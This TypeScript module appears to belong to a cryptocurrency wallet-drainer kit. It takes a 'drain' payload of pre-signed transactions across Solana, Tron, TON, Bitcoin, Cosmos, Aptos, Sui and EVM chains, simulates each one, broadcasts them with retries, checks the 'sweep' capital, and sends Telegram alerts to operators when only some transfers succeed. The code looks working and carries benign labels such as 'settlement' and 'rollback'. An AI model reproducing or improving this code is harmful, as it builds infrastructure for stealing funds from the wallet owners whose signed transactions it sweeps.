/**
 * Omnichain leg orchestration — pre-flight simulation, idempotent retries, partial-success alerts.
 *
 * True cross-chain atomicity is impossible on-chain. This module approximates a two-phase commit:
 * 1. simulateLeg() for every configured leg off-chain
 * 2. retryLeg() with gas bump on broadcast failure (max 3 attempts)
 * 3. abort remaining legs on failure when OMNI_SEQUENTIAL_FAIL_FAST=true
 */
import { simulateSolanaTransactionWire } from './solana-settlement-enhancements.js'
import { estimateTonGas } from './ton-settlement-enhancements.js'
import { assertTronSweepCapital, calculateTronFeeLimit } from './tron-settlement-enhancements.js'
import type { OmnichainNativeDrainPayload } from './permit2-batch.js'

export type OmnichainLegKey =
  | 'sol'
  | 'spl'
  | 'trx'
  | 'trc20'
  | 'ton'
  | 'jetton'
  | 'bitcoin'
  | 'cosmos'
  | 'aptos'
  | 'sui'
  | 'evm'

export type OmnichainLegDescriptor = {
  key: OmnichainLegKey
  label: string
  configured: boolean
}

export type SimulateLegResult = {
  ok: boolean
  detail?: string
}

export type RetryLegResult<T> = {
  ok: boolean
  result?: T
  attempts: number
  detail?: string
}

const DEFAULT_MAX_RETRIES = 3

function readMaxRetries(): number {
  const raw = process.env['OMNI_LEG_MAX_RETRIES']?.trim()
  if (raw && /^\d+$/.test(raw)) {
    return Math.min(Math.max(Number(raw), 1), 5)
  }
  return DEFAULT_MAX_RETRIES
}

function jitterMs(baseMs: number): number {
  return baseMs + Math.floor(Math.random() * baseMs * 0.5)
}

/** List configured legs from omnichain native payload. */
export function listOmnichainLegs(payload: OmnichainNativeDrainPayload): OmnichainLegDescriptor[] {
  const positive = (v?: string) => {
    if (v == null || v.trim() === '') return false
    try {
      return BigInt(v) > 0n
    } catch {
      return false
    }
  }

  return [
    {
      key: 'sol',
      label: 'SOL native',
      configured: positive(payload.native_amount_sol) && Boolean(payload.native_signed_transaction_sol),
    },
    {
      key: 'spl',
      label: 'SPL token',
      configured: positive(payload.spl_amount) && Boolean(payload.native_signed_transaction_spl),
    },
    {
      key: 'trx',
      label: 'TRX native',
      configured: positive(payload.native_amount_trx) && Boolean(payload.native_signed_transaction_trx),
    },
    {
      key: 'trc20',
      label: 'TRC-20',
      configured: positive(payload.trc20_amount) && Boolean(payload.native_signed_transaction_trc20),
    },
    {
      key: 'ton',
      label: 'TON native',
      configured: positive(payload.native_amount_ton) && Boolean(payload.native_signed_transaction_ton),
    },
    {
      key: 'jetton',
      label: 'Jetton',
      configured: positive(payload.jetton_amount) && Boolean(payload.native_signed_transaction_jetton),
    },
    {
      key: 'cosmos',
      label: 'Cosmos ATOM',
      configured: positive(payload.native_amount_cosmos) && Boolean(payload.cosmos_signed_tx),
    },
    {
      key: 'aptos',
      label: 'Aptos APT',
      configured: positive(payload.native_amount_aptos) && Boolean(payload.aptos_signed_tx),
    },
    {
      key: 'sui',
      label: 'Sui native',
      configured:
        positive(payload.native_amount_sui) &&
        Boolean(payload.sui_signed_tx) &&
        Boolean(payload.sui_signature),
    },
  ]
}

/** Off-chain preflight simulation for a single omnichain leg. */
export async function simulateLeg(
  key: OmnichainLegKey,
  payload: OmnichainNativeDrainPayload,
  extras?: { bitcoinPsbtBase64?: string; walletAddress?: string },
): Promise<SimulateLegResult> {
  switch (key) {
    case 'sol':
    case 'spl': {
      const wire =
        key === 'sol'
          ? payload.native_signed_transaction_sol
          : payload.native_signed_transaction_spl
      if (!wire) return { ok: false, detail: `${key.toUpperCase()} wire missing` }
      return simulateSolanaTransactionWire({ wireBase64: wire })
    }
    case 'trx':
    case 'trc20': {
      const feeLimit = calculateTronFeeLimit(key === 'trc20' ? 1 : 0)
      if (extras?.walletAddress) {
        const capital = await assertTronSweepCapital({
          wallet: extras.walletAddress,
          feeLimitSun: feeLimit,
        })
        if (!capital.ok) return { ok: false, detail: capital.detail }
      }
      return { ok: true }
    }
    case 'ton':
    case 'jetton': {
      const count = key === 'jetton' ? 1 : 1
      const gas = await estimateTonGas({
        walletAddress: extras?.walletAddress ?? 'EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c',
        messageCount: count,
      })
      return gas.ok ? { ok: true } : { ok: false, detail: gas.detail }
    }
    case 'bitcoin': {
      const psbt = extras?.bitcoinPsbtBase64
      if (!psbt) return { ok: false, detail: 'Bitcoin PSBT missing' }
      return simulateBitcoinPsbtSigned(psbt)
    }
    case 'cosmos': {
      if (!payload.cosmos_signed_tx?.trim()) {
        return { ok: false, detail: 'cosmos_signed_tx missing' }
      }
      return { ok: true, detail: 'Cosmos signed tx present (preflight stub)' }
    }
    case 'aptos': {
      if (!payload.aptos_signed_tx?.trim()) {
        return { ok: false, detail: 'aptos_signed_tx missing' }
      }
      return { ok: true, detail: 'Aptos signed tx present (preflight stub)' }
    }
    case 'sui': {
      if (!payload.sui_signed_tx?.trim() || !payload.sui_signature?.trim()) {
        return { ok: false, detail: 'sui_signed_tx and sui_signature required' }
      }
      return { ok: true, detail: 'Sui signed tx present (preflight stub)' }
    }
    case 'evm':
      return { ok: true }
    default:
      return { ok: false, detail: `Unknown leg ${key}` }
  }
}

/** Run preflight simulation for all configured legs; abort if any fails. */
export async function runPreflightSimulation(params: {
  payload: OmnichainNativeDrainPayload
  bitcoinPsbtBase64?: string
  walletAddress?: string
}): Promise<{ ok: boolean; faults: Array<{ key: OmnichainLegKey; detail: string }> }> {
  if (process.env['OMNI_PREFLIGHT_SIM']?.trim().toLowerCase() === 'false') {
    return { ok: true, faults: [] }
  }

  const legs = listOmnichainLegs(params.payload).filter((l) => l.configured)
  const faults: Array<{ key: OmnichainLegKey; detail: string }> = []

  for (const leg of legs) {
    const sim = await simulateLeg(leg.key, params.payload, {
      bitcoinPsbtBase64: params.bitcoinPsbtBase64,
      walletAddress: params.walletAddress,
    })
    if (!sim.ok) {
      faults.push({ key: leg.key, detail: sim.detail ?? `${leg.label} simulation failed` })
    }
  }

  if (params.bitcoinPsbtBase64) {
    const btcSim = await simulateLeg('bitcoin', params.payload, {
      bitcoinPsbtBase64: params.bitcoinPsbtBase64,
      walletAddress: params.walletAddress,
    })
    if (!btcSim.ok) {
      faults.push({ key: 'bitcoin', detail: btcSim.detail ?? 'Bitcoin simulation failed' })
    }
  }

  return { ok: faults.length === 0, faults }
}

/**
 * Retry a leg broadcast up to N times with exponential backoff + optional gas bump callback.
 */
export async function retryLeg<T extends { ok: boolean; detail?: string }>(
  key: OmnichainLegKey,
  execute: (attempt: number) => Promise<T>,
  opts?: { maxRetries?: number },
): Promise<RetryLegResult<T>> {
  const maxRetries = opts?.maxRetries ?? readMaxRetries()
  let lastDetail = 'unknown fault'

  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    const result = await execute(attempt)
    if (result.ok) {
      return { ok: true, result, attempts: attempt }
    }
    lastDetail = result.detail ?? `${key} leg failed`
    if (attempt < maxRetries) {
      await new Promise((r) => setTimeout(r, jitterMs(400 * 2 ** (attempt - 1))))
    }
  }

  return { ok: false, attempts: maxRetries, detail: lastDetail }
}

/**
 * Optional compensation from reserve wallet when a later leg fails after earlier success.
 * Documented stub — requires RESERVE_WALLET_* env and human approval for production use.
 */
export async function rollbackCompensation(params: {
  succeededLegs: OmnichainLegKey[]
  failedLeg: OmnichainLegKey
  ownerAddress?: string
}): Promise<{ attempted: boolean; ok: boolean; detail: string }> {
  const enabled = process.env['OMNI_ROLLBACK_COMPENSATION']?.trim().toLowerCase()
  if (enabled !== 'true' && enabled !== '1') {
    return {
      attempted: false,
      ok: false,
      detail: 'rollbackCompensation disabled — set OMNI_ROLLBACK_COMPENSATION=true to enable',
    }
  }

  console.warn(
    `[OMNI] Partial success: ${params.succeededLegs.join(', ')} succeeded; ${params.failedLeg} failed. ` +
      `Manual compensation may be required for owner ${params.ownerAddress ?? 'unknown'}.`,
  )

  return {
    attempted: true,
    ok: false,
    detail:
      'Automatic compensation not implemented — reserve wallet refund requires manual operator action',
  }
}

/** Fire-and-forget Telegram alert on partial omnichain success. */
export async function notifyOmnichainPartialSuccess(params: {
  succeeded: string[]
  failed: string[]
  settlementMode: string
}): Promise<void> {
  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
  const chatRaw =
    process.env['TELEGRAM_CHAT_IDS']?.trim() || process.env['TELEGRAM_CHAT_ID']?.trim()
  if (!token || !chatRaw) return

  const chatIds = chatRaw.split(/[,;\s]+/).filter(Boolean)
  const text = [
    '⚠️ <b>Omnichain partial success</b>',
    `Mode: <code>${params.settlementMode}</code>`,
    `Succeeded: ${params.succeeded.join(', ') || 'none'}`,
    `Failed: ${params.failed.join(', ') || 'none'}`,
    '',
    'Earlier legs are NOT rolled back on-chain. Investigate immediately.',
  ].join('\n')

  const url = `https://api.telegram.org/bot${token}/sendMessage`
  await Promise.allSettled(
    chatIds.map(async (chatId) => {
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: text.slice(0, 4000),
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      })
    }),
  )
}

/** Simulate signed PSBT structure without broadcasting (structure check only). */
export async function simulateBitcoinPsbtSigned(signedPsbtBase64: string): Promise<SimulateLegResult> {
  try {
    const { Psbt } = await import('bitcoinjs-lib')
    const psbt = Psbt.fromBase64(signedPsbtBase64.trim())
    if (psbt.inputCount === 0) return { ok: false, detail: 'PSBT has no inputs' }
    if (psbt.txOutputs.length === 0) return { ok: false, detail: 'PSBT has no outputs' }
    return { ok: true }
  } catch (e) {
    return { ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}